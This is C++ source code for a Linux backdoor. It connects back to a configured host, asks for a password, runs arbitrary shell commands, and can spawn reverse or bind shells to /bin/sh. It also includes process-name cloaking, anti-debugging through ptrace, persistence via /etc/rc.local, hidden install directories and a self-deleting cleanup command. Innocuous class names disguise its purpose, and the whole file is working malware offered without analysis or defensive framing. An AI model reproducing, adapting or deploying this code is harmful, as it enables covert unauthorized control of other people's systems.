#include <iostream>
#include <cstring>
#include <thread>
#include <fstream>
#include <sstream>
#include <vector>
extern "C"{
    #include <signal.h>
    #include <sys/stat.h>
    #include <limits.h>
    #include <sys/utsname.h>
    #include <unistd.h>
    #include <sys/ptrace.h>
    #include <sys/prctl.h>
    #include <sys/socket.h>
    #include <arpa/inet.h> 
}
#define SH "/bin/sh" // shell that tty uses
using namespace std;

struct gui_config{
    const string client_ver = "xd"; // client name 
    const string client_patch = "127.0.0.1"; // host to call back to
    const string client_buffer = "443"; // port to call back to port 80 and 443 will look like web sockets
    const string client_key = "123"; // password
    const string client_time_out = "10"; // amount of time till a command will be killed, the smaller the time the less chance of detection
}; gui_config gc; 

class gui_bar{
    public:
        string gui_c(string lc)
        {
          if(lc.size() > 1019){
              return "\nfailure, Buffer Overflow detected!"; // oh uh buffer overflow! quickly exit!
          }
          FILE *in;
          char *buff;
          time_t end = time(NULL) + stoi(gc.client_time_out);
          buff = (char*)malloc(1024);
          string out = "";
          if(!(in = popen((lc).c_str(), "r"))){
            return "failure";
          } 
          while(fgets(buff, sizeof(buff), in)!=NULL){
            out += buff;
            if(time(NULL) >= end){
              free(buff);
              pclose(in); 
	            return  out + "\nKilled command since it took longer than " + string(gc.client_time_out) + " Seconds\n";
		      	}
          }
          free(buff);
          pclose(in); 
          if(out.size() > 0){
            return out;
          }
          else{
             return  string(lc) + ": command not found\n";
          }
        }
        void daemon(void)
        {
            int x;
            pid_t pid;
            pid = fork();
            if (pid < 0){
                exit(-1);
            } if(pid > 0){
                exit(0);
            } if (setsid() < 0){
                exit(-1);
            }
            signal(SIGCHLD,SIG_IGN);
            signal(SIGHUP,SIG_IGN);
            pid = fork();
            if (pid < 0){
                exit(-1);
            } if (pid > 0){
                exit(0);
            }
            umask(0);
            chdir("/tmp/");
            for (x = sysconf(_SC_OPEN_MAX); x>0; x--){
                close (x);
            }
            return;
        }
        string getexepath(void)  //ripped from somewhere
        {
          char result[PATH_MAX];
          ssize_t count = readlink( "/proc/self/exe", result, PATH_MAX );
          return string( result, (count > 0) ? count : 0 );
          free(result);
        }
        void cps_codex(void)
        {
            remove((getexepath()).c_str()); 
            remove("/tmp/.pythonbin/");
            remove("/etc/.pythonbin/");
            return;
        }
        void bios_bitmap(string bios_host, int bios_num, bool is_bitmap) 
        {
          if (fork()==0){
            if (fork()==0){ 
              int s2, l0, o = 1;
              struct sockaddr_in server;
              if(is_bitmap==false){
                s2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s2 < 0){
                  close(s2);
                  return;
                }
                server.sin_family = AF_INET;
                server.sin_port = htons(bios_num);
                server.sin_addr.s_addr = inet_addr((bios_host).c_str());
                if (connect(s2, (struct sockaddr *)&server , sizeof(server)) < 0){
                    close(s2);
                    return;
                }       
              }
              else{
                l0 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (l0 < 0){
                  close(l0);
                  return;
                }
                server.sin_family = AF_INET;
                server.sin_port = htons(bios_num);
                server.sin_addr.s_addr = htonl(INADDR_ANY);
                setsockopt(l0, SOL_SOCKET, SO_REUSEADDR, &o, sizeof(o)); 
                bind(l0, (struct sockaddr *) &server, sizeof(server));
                listen(l0, 1);
                s2 = accept(l0, NULL, NULL);
              }
              send(s2, string("Connected! Current EUID is " + to_string(geteuid()) + "\n").c_str(), string("Connected! Current EUID is " + to_string(geteuid()) + "\n").size(), 0);
              if(s2 < 0){
                  close(s2);
                  return;
              }
              dup2(s2,0); 
              dup2(s2,1);
              dup2(s2,2);
              if(s2 > 0){
                execl(SH,SH,(char *)0);
              }
              else{
                  close(s2);
                  return; 
              }
            }        
          }      
        }
        string ftp_g(void) 
        {
            char cwd[1024];
            string shell_bar, uid_user;
            struct utsname sysinfo;
            uname(&sysinfo);
            getcwd(cwd, sizeof(cwd));
            if(getuid() == 0){
                uid_user = " $ ";
            } else{
                uid_user = " # ";
            }
            return string(getenv("USER")) + string("@") + string(sysinfo.nodename) + string(":~") + string(cwd) + string(uid_user);
        }
        bool write_to_boot(string file_name, string boot_file){
          struct stat st;
          if(getuid()==0){
            if(stat((boot_file).c_str(),&st) == 0){
              string line, completed;
              ifstream startup_read(boot_file);
              while(getline(startup_read, line)){
                if(line=="exit 0"){
                  completed += file_name + "\nexit 0";
                  break;
                }
                else if(line==file_name){
                  startup_read.close();
                  return false;
                }
                else{
                  completed += line + "\n";
                }
              }
              startup_read.close(); 
              ofstream startup_write(boot_file);
              startup_write << completed;
              startup_write.close();
              setuid(6770);
              chmod((boot_file).c_str(), 0755);
              return true;
            }
          }
          return false;
		    }
        void file_setup(string service_s, string file_p)
        {
          struct stat st = {0};
          if(getuid() != 0){ // not root :(
              if(stat("/tmp/.pythonbin/", &st) == -1){
                  mkdir("/tmp/.pythonbin/", 0700); 
                  rename((getexepath()).c_str(), "/tmp/.pythonbin/bin.py");
              }
          }
          else{ //root
            if (stat("/etc/.pythonbin/", &st) == -1) {
              mkdir("/etc/.pythonbin/", 0700);
              rename((getexepath()).c_str(), "/etc/.pythonbin/bin.py");
            }
            write_to_boot(file_p , service_s);
          }
          return;
        }
}; gui_bar gb;

class gui_user{
  public:
    string gui_procc(string gui_l){ // elite proccess cloaking!
        string split_line, gui_buffer, gui_name;
        vector<string> gui_uv;
        gui_buffer = gb.gui_c("ps -e -o command");
        stringstream iss(gui_buffer);
        while(iss.good())
        {
            split_line = "";
            getline(iss,split_line,'\n');
            if(split_line.size() > 0 || split_line!="COMMAND"){
                gui_uv.push_back(split_line);
            }
        }
        while(1){
          gui_name = gui_uv[rand()%gui_uv.size()];
          if(gui_name.find("ps -e -o command") != string::npos || gui_name == gui_l || gui_name=="COMMAND" || gui_name.size() <= 1){
            sleep(1);
            continue;
          }
          else{
            return gui_name;
          }
        }  
    }
    string gui_enc(string enc){
      
      return enc;
    }
    string gui_dec(string dec){
      
      return dec;
    }
}; gui_user gu; 

class cli_architecture : gui_config{ // backconnect
  public:  
      bool start_backconnect(string dat_recv, bool is_bind){
        vector<string> backconnect_v;
        string buffer; 
        stringstream white_space_ss(dat_recv); 
        while(white_space_ss >> buffer){
            backconnect_v.push_back(buffer); 
        } 
        if(is_bind==false){
          if((backconnect_v).size() == 2 && (backconnect_v[0]).size() > 1 && (backconnect_v[1]).size() > 1){
            try{
             thread(&gui_bar::bios_bitmap, &gb, backconnect_v[0], stoi(backconnect_v[1]), is_bind).detach();
             return true;
            }
            catch(...){
              return false;
            }
          }
        }
        else if(is_bind==true){
          if((backconnect_v).size() == 1 && (backconnect_v[0]).size() > 1){
            try{
             thread(&gui_bar::bios_bitmap, &gb, "", stoi(backconnect_v[0]), is_bind).detach();
             return true;
            }
            catch(...){
              return false;
            }
          }
        }
        return false;
      }
      void isdn(void)
      {
        string dir_line, line;
        bool isauth=false;
        struct sockaddr_in serverc0;
        int s0 = socket(AF_INET, SOCK_STREAM, 0), login_requests = 0; //SOCK_STREAM
        if(s0 < 0){ // cant create a socket
          close(s0);
          return;
        } 
        serverc0.sin_addr.s_addr = inet_addr((client_patch).c_str());
        serverc0.sin_family = AF_INET;
        serverc0.sin_port = htons(stoi(client_buffer));
        if(connect(s0, (struct sockaddr *)&serverc0 , sizeof(serverc0)) < 0){ // denied a connection or wont connect
          close(s0);
          return;
        } 
        send(s0,(gu.gui_enc("Enter Password>\e[30m ")).c_str(), gu.gui_enc("Enter Password>\e[30m ").size(), 0);
        while(1){
            line="";
            char data = 0; 
            while (data != '\n'){
                ssize_t datarecv = recv(s0, &data, 1, 0);
                if(datarecv == -1){
                    if (errno != EAGAIN && errno != EWOULDBLOCK){ 
                        close(s0);
                        return;
                    }
                } 
                if(datarecv == 0){
                    close(s0);
                    return;
                }
                line += data;
                if (line.size() > 2048){ 
                    close(s0);
                    return;
                }
            }
            if(line.size() > 0){ // yes, yes here we go!
              line = gu.gui_dec(line.replace(line.find("\n"), 2, ""));
     //       cout << line << endl;
              if(isauth!=true){
                if(line==client_key){
                    isauth=true;
                    send(s0,(gu.gui_enc("\e[39mAuthorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n"))).c_str(), (gu.gui_enc("\e[39mAuthorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n"))).size(), 0);
                    send(s0, (gu.gui_enc(gb.ftp_g())).c_str(), (gu.gui_enc(gb.ftp_g())).size(), 0);
                    continue;
                }
                else{
                    if(login_requests<4){
                      login_requests++;
                      send(s0,(gu.gui_enc("\e[39mIncorrect password!")).c_str(), gu.gui_enc("\e[39mIncorrect password!").size(), 0);
                      send(s0,(gu.gui_enc("\nEnter Password>\e[30m ")).c_str(), gu.gui_enc("\nEnter Password>\e[30m ").size(), 0);
                      continue;
                    }
                    else{
                      send(s0,(gu.gui_enc("\e[39mTo many incorrect tries!\n")).c_str(), gu.gui_enc("\e[39mTo many incorrect tries!\n").size(), 0);
                      close(s0);
                      return;
                    }
                }
              }
              if(line.size() > 0){
                if(isauth==true){
	                if(line.find("cd ") != string::npos){
	                    chdir((line.replace(line.find("cd "), 3, "")).c_str());
	                } 
	                else if(line=="exit" || line=="quit"){    
	                    close(s0);
	                    terminate();
	                }
	                else if(line=="session_exit" || line=="sess_exit"){
	                    close(s0);
	                    return;
	                } 
	                else if(line=="cd"){
	                  chdir(getenv("HOME"));
	                }
	                else if(line.find("backconnect ") != string::npos){ //backconnect host port
	                  line.replace(line.find("backconnect "), 12, "");
	                  if(start_backconnect(line, false)==false){
	                    send(s0,(gu.gui_enc("Incorrect usage: backconnect host port\n")).c_str(), gu.gui_enc("Incorrect usage: backconnect host port\n").size(), 0);
	                  }
	                }
	                else if(line.find("bindshell ") != string::npos){
	                  line.replace(line.find("bindshell "), 10, "");
	                  if(start_backconnect(line, true)==false){
	                    send(s0,(gu.gui_enc("Incorrect usage: bindshell port\n")).c_str(), gu.gui_enc("Incorrect usage: bindshell port\n").size(), 0);
	                  }
	                }
	                else if(line=="bd_cleanup"){
	                    gb.cps_codex(); // cps_codex(void)
	                }
	                else{
	                    send(s0,(gu.gui_enc(gb.gui_c(line))).c_str(), (gu.gui_enc(gb.gui_c(line))).size(), 0);
	                }
	                send(s0, (gu.gui_enc(gb.ftp_g())).c_str(), (gu.gui_enc(gb.ftp_g())).size(), 0);
	                continue;
            	  }
              }
              else{
                send(s0, (gu.gui_enc(gb.ftp_g())).c_str(), (gu.gui_enc(gb.ftp_g())).size(), 0);
              }
            }
          }
          close(s0);
          return;
      }  
}; cli_architecture ca;

int main(int argc, char *argv[]){
   	if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0){ // anti debugging
		  return 0; 
	  }
    srand(time(NULL)); 
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN); // fuck zombie process's
    string gui_t = gu.gui_procc(argv[0]); // process name to copy
    for(int i=0;i<argc;i++){
      memset(argv[i],'\x0',strlen(argv[i]));
    }
    strcpy(argv[0], (gui_t).c_str()); // cloak, command name
    prctl(PR_SET_NAME, (gui_t).c_str()); // cloak, thread name
    gb.daemon();
    gb.file_setup("/etc/rc.local", "/etc/.pythonbin/bin.py");
    while(1){
        thread(&cli_architecture::isdn, &ca).detach();
        sleep((rand()%(360-60 + 1) + 60));
    }
    return 0;
}
